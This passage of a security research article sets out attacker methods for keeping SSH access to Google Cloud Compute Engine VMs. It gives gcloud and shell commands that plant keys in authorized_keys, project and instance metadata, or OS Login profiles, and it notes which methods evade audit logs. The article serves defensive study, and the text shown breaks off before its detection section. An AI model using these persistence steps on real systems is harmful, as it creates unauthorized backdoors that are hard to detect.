        <li><a href="#detecting-addition--modification-in-project-level-metadata">Detecting addition / modification in Project-level Metadata</a></li>
        <li><a href="#detecting-addition--modification-in-instance-level-metadata">Detecting addition / modification in Instance-level Metadata</a></li>
        <li><a href="#detecting-addition--modification-in-both-project-level-and-instance-level-metadata">Detecting addition / modification in both Project-level and Instance-level Metadata</a></li>
      </ul>
    </li>
    <li><a href="#persisting-via-direct-ssh-key-addition-in-the-authorized_keys-file">Persisting via Direct SSH Key addition in the &ldquo;authorized_keys&rdquo; file</a></li>
    <li><a href="#persisting-in-compute-engine-vms-os-login-1">Persisting in Compute Engine VMs: OS Login</a></li>
  </ul>

  <ul>
    <li>
      <ul>
        <li><a href="#os-login---associating-the-public-key-with-google-cloud-user-account">OS Login - Associating the Public Key with Google Cloud User Account</a></li>
        <li><a href="#os-login---associates-the-public-key-with-google-cloud-service-account">OS Login - Associates the Public Key with Google Cloud Service Account</a></li>
        <li><a href="#block-project-wide-ssh-keys-enabled">Block Project-wide SSH Keys Enabled</a></li>
        <li><a href="#block-project-wide-ssh-keys-disabled">Block Project-wide SSH Keys Disabled</a></li>
      </ul>
    </li>
  </ul>
</nav>
        <h1 id="persistance-via-ssh-key-addition-block-project-wide-ssh-keys--os-login">Persistance via SSH Key Addition (Block Project-wide SSH Keys &amp; OS Login)</h1>
<!-- raw HTML omitted -->
<ul>
<li><a href="#metadata-the-centralized-configuration-store">Metadata: The Centralized Configuration Store</a></li>
<li><a href="#os-login---a-modern-approach">OS Login - A Modern Approach</a></li>
<li><a href="#attack">Attack</a>
<ul>
<li><a href="#persisting-in-compute-engine-vms-default--block-project-wide-ssh-keys">Persisting in Compute Engine VMs: Default &amp; &ldquo;Block Project-wide SSH Keys&rdquo;</a>
<ul>
<li><a href="#method-1-attacker-logs-into-the-vm-directly-and-adds-public-keys-to-be-able-to-login-later-or-persist">Method 1: Attacker Logs into the VM directly and adds Public Key(s) to be able to login later or persist.</a></li>
<li><a href="#method-2-attacker-adds-the-public-keys-to-the-project-metadata">Method 2: Attacker adds the Public Key(s) to the Project Metadata.</a></li>
<li><a href="#method-3-attacker-adds-the-public-keys-to-the-instance-metadata">Method 3: Attacker adds the Public Key(s) to the Instance Metadata.</a></li>
</ul>
</li>
<li><a href="#persisting-in-compute-engine-vms-os-login">Persisting in Compute Engine VMs: OS Login</a>
<ul>
<li><a href="#method-1-attacker-logs-into-the-vm-instance-1-directly-via-certain-means-creates-sshauthorized_keys-file-in-home-dir-and-adds-public-keys-to-be-able-to-login--persist">Method 1: Attacker Logs into the VM (instance-1) directly via certain means, creates .ssh/authorized_keys file in HOME dir. and adds Public Key(s) to be able to login / persist.</a></li>
<li><a href="#method-2-attacker-associates-the-public-key-with-google-cloud-user-account">Method 2: Attacker associates the Public Key with Google Cloud User Account.</a></li>
<li><a href="#method-3-attacker-associates-the-public-key-with-google-cloud-service-account">Method 3: Attacker associates the Public Key with Google Cloud Service Account.</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#detection">Detection</a>
<ul>
<li><a href="#persisting-in-compute-engine-vms-default--block-project-wide-ssh-keys-1">Persisting in Compute Engine VMs: Default &amp; &ldquo;Block Project-wide SSH Keys&rdquo;</a>
<ul>
<li><a href="#detecting-addition--modification-in-project-level-metadata">Detecting addition / modification in Project-level Metadata</a></li>
<li><a href="#detecting-addition--modification-in-instance-level-metadata">Detecting addition / modification in Instance-level Metadata</a></li>
<li><a href="#detecting-addition--modification-in-both-project-level-and-instance-level-metadata">Detecting addition / modification in both Project-level and Instance-level Metadata</a></li>
</ul>
</li>
<li><a href="#persisting-via-direct-ssh-key-addition-in-the-authorized_keys-file">Persisting via Direct SSH Key addition in the &ldquo;authorized_keys&rdquo; file</a></li>
<li><a href="#persisting-in-compute-engine-vms-os-login-1">Persisting in Compute Engine VMs: OS Login</a></li>
</ul>
</li>
<li><a href="#gator---how-can-it-help">GATOR - How can it help?</a></li>
</ul>
<!-- raw HTML omitted -->
<h1 id="heading"></h1>
<p>SSH (Secure Shell) has long been the de facto standard for secure remote access to UNIX-based systems. Traditionally, SSH relies on key-based authentication, where a user&rsquo;s Public Key is stored on the server, and the corresponding Private Key is held by the user. When the user attempts to connect, the server challenges the user to prove they have the corresponding Private Key, ensuring a secure handshake.</p>
<p>However, as cloud computing evolved and infrastructure scaled to unprecedented levels, managing individual SSH keys for each user and each server became a daunting task. The traditional method of manually placing Public keys in the ~/.ssh/authorized_keys file of each server was no longer feasible for large-scale deployments. There was a need for a more scalable, centralized, and automated solution.</p>
<p>Google Cloud Platform (GCP) came up with its innovative approach to SSH key management. Traditional SSH methods relied on individual VM configurations, which could become cumbersome and challenging to manage at scale. Recognizing these challenges, GCP introduced a centralized system, allowing for more streamlined, efficient, and secure management of SSH keys, irrespective of the number of VMs in operation. This centralized system is built upon the concept of metadata, which serves as a repository for configuration data, including SSH keys.</p>
<h2 id="metadata-the-centralized-configuration-store">Metadata: The Centralized Configuration Store</h2>
<p>In GCP, metadata provides a unified way to store and retrieve configuration information without having to access the VM directly. This not only simplifies the management process but also enhances security by reducing direct interactions with the VMs.</p>
<p>Within this metadata framework, GCP offers two distinct levels:</p>
<ul>
<li>
<p><strong>Project Metadata</strong>: This is a shared configuration space, where data can be stored and made accessible to every VM within that specific project. Among other things, both Project and Instance metadata can include Public SSH keys. When these keys are added to Project Metadata, GCP automatically populates them into the ~/.ssh/authorized_keys file of every VM instance within that project. This ensures consistent access controls across all instances in a project. It&rsquo;s a powerful tool for administrators who want to maintain consistent configurations across multiple VMs.</p>
</li>
<li>
<p><strong>Instance Metadata</strong>: For more granular control, GCP provides instance-specific metadata. This allows for VM-specific configurations, ensuring that particular settings or data are confined to a single VM, without affecting others in the project. If an SSH key is added to an instance&rsquo;s metadata, it will be populated into that specific VM&rsquo;s ~/.ssh/authorized_keys file. This is particularly useful for instances that require different access controls than the broader project.</p>
</li>
</ul>
<blockquote>
<p><strong>Usecase</strong>: Consider a scenario where a project contains multiple VMs - some for development and testing, while others for production. The development team needs access to all VMs for updates and debugging, so their keys are added to the project metadata. However, a third-party auditor requires access only to a specific production VM to review system logs. In this case, the auditor&rsquo;s key would be added to the instance-specific metadata of that particular VM, ensuring restricted access.</p>
</blockquote>
<p>By leveraging these metadata levels, GCP offers a flexible and robust system that caters to both broad and specific configuration needs, ensuring that VMs are both accessible and secure.</p>
<p>One of the features GCP offers is the &ldquo;<strong>Block project-wide SSH keys</strong>&rdquo; option, which can be enabled at Instance Level not Project Level. When enabled for a specific VM instance, this feature ensures that only keys specified in the Instance Metadata can be used to access that VM, overriding any keys specified at the Project level. This provides an additional layer of granularity and control, allowing administrators to set specific access controls for individual VMs.</p>
<p>However, GCP&rsquo;s innovations in the realm of SSH access don&rsquo;t end with metadata. As the cloud ecosystem evolved and security demands intensified, there was need for even more sophisticated access controls, this is where Google introduced OS Login.</p>
<h2 id="os-login---a-modern-approach">OS Login - A Modern Approach</h2>
<p><strong>OS Login</strong> is a feature that seamlessly integrates SSH key management with Google Cloud Identity. This integration offers a dynamic and fortified method for managing SSH access. OS Login can be enabled at both Project and Instance Level. When OS Login is activated (by setting <em>enable-oslogin</em> to <em>TRUE</em>) the conventional practice of utilizing the ~/.ssh/authorized_keys file for SSH key storage is sidestepped. If OS Login is activated at the Project Level (by setting <em>enable-oslogin</em> to <em>TRUE</em>), it becomes the default for all VMs in that project. However, this can be overridden by setting the environment variable &ldquo;<em>enable-oslogin</em>&rdquo; to &ldquo;<em>FALSE</em>&rdquo; at the Instance level to disable OS Login.</p>
<p>The beauty of OS Login lies in its ability to directly link SSH keys with user or service accounts in GCP, thereby introducing an added layer of identity verification to the SSH authentication process.</p>
<p>Below is a attached Image which expalain the overall process discussed above.</p>
<p><img src="https://drive.google.com/uc?id=17zLXP9Y91QunzEBuU6LdNC4o7pMB4Z8k" alt="1"></p>
<h1 id="attack">Attack</h1>
<p>When it comes to securing Google Cloud Platform&rsquo;s Compute Engine VM instances, there are two key configurations that often come into play: &ldquo;Block project-wide SSH keys&rdquo; and &ldquo;OS Login.&rdquo; While these settings are designed to enhance security, they can also be exploited if not properly managed. Below it has been explained how the VMs with both these configuration can be abused by attackers.</p>
<ol>
<li>Persisting in Compute Engine VMs: Default &amp; &ldquo;Block Project-wide SSH Keys&rdquo;</li>
<li>Persisting in Compute Engine VMs: OS Login</li>
</ol>
<h2 id="persisting-in-compute-engine-vms-default--block-project-wide-ssh-keys">Persisting in Compute Engine VMs: Default &amp; &ldquo;Block Project-wide SSH Keys&rdquo;</h2>
<p><img src="https://drive.google.com/uc?id=1tQlyvvaqqb6gyIm0Ht_7pzFmEQxEVaQ6" alt="2"></p>
<p>In the Image above, there are three methods listed attackers can use to Persist in a Environment with &ldquo;Block Project-wide SSH Keys&rdquo; Enabled / Disabled. The three methods are discussed in detail below. The goal of all the three methods is to directly or indirectly add the attacker generated Public SSH Key(s) to the ~/.ssh/authorized_keys file in Instance</p>
<p>Once the attacker has successfully added the Public SSH Key(s) to the ~/.ssh/authorized_keys file in Instance, they can use the corresponding Private Key to SSH into the VM from anywhere, without needing to authenticate with GCP again. This is why it&rsquo;s considered a form of persistence; the attacker has essentially created a backdoor for themselves.</p>
<p>The attacker can disable &ldquo;Block Project-wide SSH Key&rdquo; option but we are avoiding that. This research focuses on operating in an environment with such restrictions enabled.</p>
<ul>
<li>
<p>Disable &ldquo;Block Project-wide SSH Key&rdquo; for a specific instance</p>
<div class="highlight"><pre tabindex="0" style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>gcloud compute instances <span style="color:#007020">add-metadata</span> [<span style="color:#60add5">INSTANCE_NAME</span>] --zone=[<span style="color:#60add5">ZONE</span>] --metadata=<span style="color:#007020">block-project</span>-ssh-keys=FALSE
</span></span></code></pre></div></li>
</ul>
<h3 id="method-1-attacker-logs-into-the-vm-directly-and-adds-public-keys-to-be-able-to-login-later-or-persist">Method 1: Attacker Logs into the VM directly and adds Public Key(s) to be able to login later or persist.</h3>
<p><strong>Scenario:</strong> The Attacker has successfully gained access to the VM (let&rsquo;s say instance-1) through some vulnerability, misconfiguration or even legitimate means and now wants to maintain the access / persist.</p>
<p><strong>Steps:</strong></p>
<ol>
<li>
<p>In Attackers machine, the attacker generates SSH Public and Private Key pair .</p>
<div class="highlight"><pre tabindex="0" style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#007020">ssh-keygen</span> -t rsa -C [<span style="color:#60add5">USERNAME</span>] -b <span style="color:#40a070">2048</span>
</span></span></code></pre></div><p>This will generate a Private Key <code>(~/.ssh/id_rsa)</code> and a Public Key <code>(~/.ssh/id_rsa.pub)</code>.</p>
</li>
<li>
<p>While logged in to the target instance, attacker appends their Public SSH Key to the authorized_keys file.</p>
<div class="highlight"><pre tabindex="0" style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#007020">echo </span><span style="color:#4070a0">&#34;PUBLIC_KEY&#34;</span> &gt;&gt; ~/.ssh/authorized_keys
</span></span></code></pre></div></li>
<li>
<p>The Attacker can now login to the Instance without needing to authenticate to GCP or have access to a valid User / Service Account..</p>
<div class="highlight"><pre tabindex="0" style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>ssh -i ~/.ssh/id_rsa [<span style="color:#60add5">USERNAME</span>]@[<span style="color:#60add5">EXTERNAL_IP</span>]
</span></span></code></pre></div></li>
</ol>
<blockquote>
<p>[!NOTE]</p>
<ul>
<li>This method is direct and hands-on. The Attacker is manually adding their SSH key to the VM, bypassing GCP&rsquo;s key management mechanisms.</li>
<li>The &ldquo;Block project-wide SSH keys&rdquo; option have no effect on this method. This is because the Attacker isn&rsquo;t relying on GCP to propagate or manage the SSH key. They&rsquo;re adding it directly to the ~/.ssh/authorized_keys file.</li>
<li>Evades GCP-level logging associated with key additions, making their actions less visible in the platform&rsquo;s audit trails.</li>
<li>Leaves no trace of the added key in either the Instance or Project Metadata.</li>
</ul>
</blockquote>
<h3 id="method-2-attacker-adds-the-public-keys-to-the-project-metadata">Method 2: Attacker adds the Public Key(s) to the Project Metadata.</h3>
<p><strong>Scenario:</strong> The Attacker has gained access to the GCP environment and noticed the &ldquo;Block project-wide SSH keys&rdquo; option is disabled for the target VM(s).</p>
<p><strong>Steps:</strong></p>
<ol>
<li>
<p>In Attackers machine, the attacker generates SSH Public and Private Key pair .</p>
<div class="highlight"><pre tabindex="0" style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#007020">ssh-keygen</span> -t rsa -C [<span style="color:#60add5">USERNAME</span>] -b <span style="color:#40a070">2048</span>
</span></span></code></pre></div><p>This will generate a Private Key <code>(~/.ssh/id_rsa)</code> and a Public Key <code>(~/.ssh/id_rsa.pub)</code>.</p>
</li>
<li>
<p>Add the Public SSH key to the Project-wide Metadata. Adding Public Keys to Project-wide Metadata is not that straight forward, one needs to follow certain steps to upload it. The steps are listed below.</p>
<ul>
<li>
<p>Check Existing SSH Keys in Project Metadata</p>
<p>Before adding a new SSH key, it&rsquo;s essential to check for existing keys in the Project&rsquo;s Metadata. If the existing keys are not included when adding a new one, they will be erased.</p>
<p>Run the following command to list existing SSH keys:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gcloud compute project-info describe --format<span style="color:#666">=</span><span style="color:#4070a0">&#34;value(commonInstanceMetadata[items][ssh-keys])&#34;</span>
</span></span></code></pre></div><p>Copy the output and save it into a text file, let&rsquo;s call it <code>sshkeys.txt</code>.</p>
</li>
<li>
<p>Generate a New SSH Key Pair</p>
<div class="highlight"><pre tabindex="0" style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ssh-keygen -t rsa -C <span style="color:#666">[</span>USERNAME<span style="color:#666">]</span> -b <span style="color:#40a070">2048</span>
</span></span></code></pre></div><p>This will generate a new SSH key, saving it in the <code>.ssh/id_rsa</code> file within the user directory.</p>
</li>
<li>
<p>Append the New SSH Key to <code>sshkeys.txt</code></p>
<p>Open the newly generated public key file, usually located at <code>~/.ssh/id_rsa.pub</code>, and copy its contents.</p>
<p>Open <code>sshkeys.txt</code> and append the new key at the end of the file in the following format:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#666">[</span>USERNAME<span style="color:#666">]</span>:&lt;copied_public_key&gt;
</span></span></code></pre></div></li>
<li>
<p>Update Project Metadata with New SSH Keys</p>
<p>Now that <code>sshkeys.txt</code> contains all the SSH keys (both existing and new), the Project&rsquo;s Metadata can now be updated.</p>
<div class="highlight"><pre tabindex="0" style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gcloud compute project-info add-metadata --metadata-from-file ssh-keys<span style="color:#666">=</span>sshkeys.txt
</span></span></code></pre></div></li>
</ul>
</li>
<li>
<p>The Attacker can now login to the Instance without needing to authenticate to GCP or have access to a valid User / Service Account..</p>
<div class="highlight"><pre tabindex="0" style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>ssh -i ~/.ssh/id_rsa [<span style="color:#60add5">USERNAME</span>]@[<span style="color:#60add5">EXTERNAL_IP</span>]
</span></span></code></pre></div></li>
</ol>
<blockquote>
<p>[!NOTE]</p>
<ul>
<li>This key will be automatically added to the authorized_keys file of every VM in the project that have the &ldquo;Block project-wide SSH keys&rdquo; option disabled.</li>
<li>The &ldquo;Block project-wide SSH keys&rdquo; option can have effect on this method. If the option is enabled GCP won&rsquo;t propagate the SSH key to the VM&rsquo;s ~/.ssh/authorized_keys file.</li>
<li>Key additions in the Project Metadata is logged in the platform&rsquo;s audit trails.</li>
</ul>
</blockquote>
<h3 id="method-3-attacker-adds-the-public-keys-to-the-instance-metadata">Method 3: Attacker adds the Public Key(s) to the Instance Metadata.</h3>
<p><strong>Scenario:</strong> The Attacker has gained access to the GCP environment and noticed the &ldquo;Block project-wide SSH keys&rdquo; option is enabled for the target VM(s).</p>
<p><strong>Steps:</strong></p>
<ol>
<li>
<p>In Attackers machine, the attacker generates SSH Public and Private Key pair .</p>
<div class="highlight"><pre tabindex="0" style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#007020">ssh-keygen</span> -t rsa -C [<span style="color:#60add5">USERNAME</span>] -b <span style="color:#40a070">2048</span>
</span></span></code></pre></div><p>This will generate a Private Key <code>(~/.ssh/id_rsa)</code> and a Public Key <code>(~/.ssh/id_rsa.pub)</code>.</p>
</li>
<li>
<p>Add the Public SSH key to the Instance metadata of the VM. Just like Project-wide Metadata, adding Public Keys to Instance Metadata is not that straight forward, one needs to follow certain steps to upload it. The steps are listed below.</p>
<ul>
<li>
<p>Check Existing SSH Keys in Instance Metadata</p>
<p>Before adding a new SSH key, it&rsquo;s essential to check for existing keys in your Instance metadata. If you don&rsquo;t include these existing keys when adding a new one, they will be erased.</p>
<p>Run the following command to list existing SSH keys:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gcloud compute instances describe <span style="color:#666">[</span>INSTANCE-NAME<span style="color:#666">]</span> --zone <span style="color:#666">[</span>ZONE<span style="color:#666">]</span>
</span></span></code></pre></div><p>Copy the output and save it into a text file, let&rsquo;s call it <code>sshkeys.txt</code>.</p>
</li>
<li>
<p>Generate a New SSH Key Pair</p>
<div class="highlight"><pre tabindex="0" style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ssh-keygen -t rsa -C <span style="color:#666">[</span>USERNAME<span style="color:#666">]</span> -b <span style="color:#40a070">2048</span>
</span></span></code></pre></div><p>This will generate a new SSH key, saving it in the <code>.ssh/id_rsa</code> file within the user directory.</p>
</li>
<li>
<p>Append the New SSH Key to <code>sshkeys.txt</code></p>
<p>Open the newly generated public key file, usually located at <code>~/.ssh/id_rsa.pub</code>, and copy its contents.</p>
<p>Open <code>sshkeys.txt</code> and append the new key at the end of the file in the following format:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#666">[</span>USERNAME<span style="color:#666">]</span>:&lt;copied_public_key&gt;
</span></span></code></pre></div></li>
<li>
<p>Update Instance Metadata with New SSH Keys</p>
<p>Now that <code>sshkeys.txt</code> contains all the SSH keys (both existing and new), the Instance&rsquo;s Metadata can now be updated.</p>
<div class="highlight"><pre tabindex="0" style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gcloud compute instances add-metadata <span style="color:#666">[</span>INSTANCE-NAME<span style="color:#666">]</span> --metadata-from-file ssh-keys<span style="color:#666">=</span><span style="color:#4070a0">&#34;sshkeys.txt&#34;</span> --zone <span style="color:#666">[</span>ZONE<span style="color:#666">]</span>
</span></span></code></pre></div></li>
</ul>
</li>
<li>
<p>The Attacker can now login to the Instance without needing to authenticate to GCP or have access to a valid User / Service Account..</p>
<div class="highlight"><pre tabindex="0" style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>ssh -i ~/.ssh/id_rsa [<span style="color:#60add5">USERNAME</span>]@[<span style="color:#60add5">EXTERNAL_IP</span>]
</span></span></code></pre></div></li>
</ol>
<blockquote>
<p>[!NOTE]</p>
<ul>
<li>The &ldquo;Block project-wide SSH keys&rdquo; option doesn&rsquo;t have effect on this method. Regardless of the option enabled or disabled, the key added to the Instance metadata will be added to the VM&rsquo;s ~/.ssh/authorized_keys file.</li>
<li>Key additions in the Project Metadata is logged in the platform&rsquo;s audit trails.</li>
</ul>
</blockquote>
<h2 id="persisting-in-compute-engine-vms-os-login">Persisting in Compute Engine VMs: OS Login</h2>
<p><img src="https://drive.google.com/uc?id=1BtgN1rPOh9wHA5SU-uFauv6a9NnB1pRi" alt="3"></p>
<p>OS Login provides a more dynamic and secure method of handling SSH access, tying SSH keys directly to user or service accounts in GCP. This integration not only streamlines access management but also adds an additional layer of identity verification to the SSH process.</p>
<p>However, like any technology, while it&rsquo;s designed to enhance security, it can also be a double-edged sword. In the hands of a savvy attacker, the very mechanisms that are meant to protect can be leveraged for nefarious purposes.</p>
<p>In the Image above, there are three methods listed attackers can use to Persist in a Environment with OS Login Enabled. The three methods are discussed in detail below. The goal of all the three methods is to associated a attacker generated Public SSH Key with either a user or service account in GCP</p>
<p>Once the attacker has successfully associated their SSH public key with either a user or service account in GCP, they can use the corresponding Private Key to SSH into the VM from anywhere, without needing to authenticate with GCP again. This is why it&rsquo;s considered a form of persistence; the attacker has essentially created a backdoor for themselves.</p>
<p>The attacker can disable &ldquo;OS Login&rdquo; from Project or Instance level by setting the environment variable &ldquo;<em>enable-oslogin</em>&rdquo; to &ldquo;<em>FALSE</em>&rdquo; and make their operation way easier to carry out, but we are avoiding that. This research focuses on operating in an environment with such restrictions enabled.</p>
<ul>
<li>
<p>Disable OS Login at the instance level</p>
<div class="highlight"><pre tabindex="0" style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>gcloud compute instances <span style="color:#007020">add-metadata</span> [<span style="color:#60add5">INSTANCE_NAME</span>] --zone=[<span style="color:#60add5">ZONE</span>] --metadata=<span style="color:#007020">enable-oslogin</span>=FALSE
</span></span></code></pre></div></li>
<li>
<p>Disable OS Login at the project level</p>
<div class="highlight"><pre tabindex="0" style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>gcloud compute <span style="color:#007020">project-info</span> <span style="color:#007020">add-metadata</span> --metadata=<span style="color:#007020">enable-oslogin</span>=FALSE
</span></span></code></pre></div></li>
</ul>
<h3 id="method-1-attacker-logs-into-the-vm-instance-1-directly-via-certain-means-creates-sshauthorized_keys-file-in-home-dir-and-adds-public-keys-to-be-able-to-login--persist">Method 1: Attacker Logs into the VM (instance-1) directly via certain means, creates .ssh/authorized_keys file in HOME dir. and adds Public Key(s) to be able to login / persist.</h3>
<p><strong>Scenario:</strong> The Attacker has successfully gained access to the VM (let&rsquo;s say instance-1) through some vulnerability, misconfiguration or even legitimate means and now wants to maintain the access / persist.</p>
<p><strong>Steps:</strong></p>
<ol>
<li>
<p>Generate SSH Public and Private Key pair .</p>
<div class="highlight"><pre tabindex="0" style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#007020">ssh-keygen</span> -t rsa -C [<span style="color:#60add5">USERNAME</span>] -b <span style="color:#40a070">2048</span>
</span></span></code></pre></div><p>This will generate a Private Key <code>(~/.ssh/id_rsa)</code> and a Public Key <code>(~/.ssh/id_rsa.pub)</code>.</p>
</li>
<li>
<p>While logged in to the target instance, attacker creates the ~/.ssh/authorized_keys file in the HOME directory, as it won&rsquo;t be present due to OS Login being enabled for the Instance or Project.</p>
<div class="highlight"><pre tabindex="0" style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#007020">cd </span>~ &amp;&amp; mkdir -p .ssh &amp;&amp; touch .ssh/authorized_keys
</span></span></code></pre></div></li>
<li>
<p>While logged in to the target instance, attacker appends their Public SSH Key to the authorized_keys file.</p>
<div class="highlight"><pre tabindex="0" style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#007020">echo </span><span style="color:#4070a0">&#34;PUBLIC_KEY&#34;</span> &gt;&gt; ~/.ssh/authorized_keys
</span></span></code></pre></div></li>
<li>
<p>The Attacker can now login to the Instance from anywhere without needing to authenticate to GCP or have access to a valid User / Service Account.</p>
<div class="highlight"><pre tabindex="0" style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>ssh -i ~/.ssh/id_rsa [<span style="color:#60add5">USERNAME</span>]@[<span style="color:#60add5">EXTERNAL_IP</span>]
</span></span></code></pre></div></li>
</ol>
<blockquote>
<p>[!NOTE]</p>
<ul>
<li>This method is direct and hands-on. The Attacker is manually adding their SSH key to the VM, bypassing GCP&rsquo;s key management mechanisms.</li>
<li>Evades GCP-level logging associated with key additions, making their actions less visible in the platform&rsquo;s audit trails.</li>
</ul>
</blockquote>
<h3 id="method-2-attacker-associates-the-public-key-with-google-cloud-user-account">Method 2: Attacker associates the Public Key with Google Cloud User Account.</h3>
<p><strong>Scenario:</strong> The Attacker has successfully gained access to the GCP Environment but notices that OS Login is enabled. The Attacker however has access to a GCP User Account and wants to maintain access by associating their Public Key with the User Account.</p>
<p><strong>Steps:</strong></p>
<ol>
<li>
<p>Authenticate with Google Cloud:</p>
<p>Attacker uses the gcloud auth login command to authenticate to the compromised user account.</p>
<div class="highlight"><pre tabindex="0" style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>gcloud auth login
</span></span></code></pre></div><p>This will open a browser window log in with the Google Cloud User account credentials.</p>
</li>
<li>
<p>Generate SSH Public and Private Key pair for Google Cloud User.</p>
<div class="highlight"><pre tabindex="0" style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#007020">ssh-keygen</span> -t rsa -b <span style="color:#40a070">4096</span> -C <span style="color:#4070a0">&#34;USERNAME@DOMAIN.com&#34;</span>
</span></span></code></pre></div><p>This will generate a Private Key <code>(~/.ssh/id_rsa)</code> and a Public Key <code>(~/.ssh/id_rsa.pub)</code>.</p>
</li>
<li>
<p>Attacker associates the Public Key with a Google Cloud User Account.</p>
<div class="highlight"><pre tabindex="0" style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>gcloud compute <span style="color:#007020">os-login</span> <span style="color:#007020">ssh-keys</span> add --key<span style="color:#666">-file</span> ~/.ssh/id_rsa.pub
</span></span></code></pre></div></li>
<li>
<p>To make sure the SSH Keys were associated with the User Account and note the POSIX username:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>gcloud compute <span style="color:#007020">os-login</span> <span style="color:#007020">describe-profile</span>
</span></span><span style="display:flex;"><span>gcloud compute <span style="color:#007020">os-login</span> <span style="color:#007020">ssh-keys</span> list
</span></span></code></pre></div></li>
<li>
<p>Attacker Uses the Private Key and the associated POSIX username to SSH into the VM instance without needing to authenticate to GCP or have access to a valid User / Service Account.</p>
<div class="highlight"><pre tabindex="0" style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>ssh -i ~/.ssh/id_rsa [<span style="color:#60add5">POSIX_USERNAME</span>]@[<span style="color:#60add5">EXTERNAL_IP</span>]
</span></span></code></pre></div></li>
<li>
<p>Attacker can revoke the associated Public Key from the Google Cloud User Account if they want:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>gcloud compute <span style="color:#007020">os-login</span> <span style="color:#007020">ssh-keys</span> list    
</span></span><span style="display:flex;"><span>gcloud compute <span style="color:#007020">os-login</span> <span style="color:#007020">ssh-keys</span> remove --key [<span style="color:#60add5">FINGERPRINT</span>]
</span></span></code></pre></div></li>
</ol>
<blockquote>
<p>[!NOTE]</p>
<ul>
<li>Key association with a User Account is logged in the platform&rsquo;s audit trails.</li>
<li>The key is associated with a specific user account, making it traceable to that identity.</li>
<li>If the user account is deleted or suspended, the attacker will lose access.</li>
</ul>
</blockquote>
<h3 id="method-3-attacker-associates-the-public-key-with-google-cloud-service-account">Method 3: Attacker associates the Public Key with Google Cloud Service Account.</h3>
<p><strong>Scenario:</strong> The Attacker has successfully gained access to the GCP Environment and notices that OS Login is enabled. The Attacker has access to a GCP Service Account and wants to maintain access by associating their Public Key with the Service Account.</p>
<p><strong>Steps:</strong></p>
<ol>
<li>
<p>Authenticate with Google Cloud using the Service Account:</p>
<p>The attacker would need to have the service account&rsquo;s JSON key file.</p>
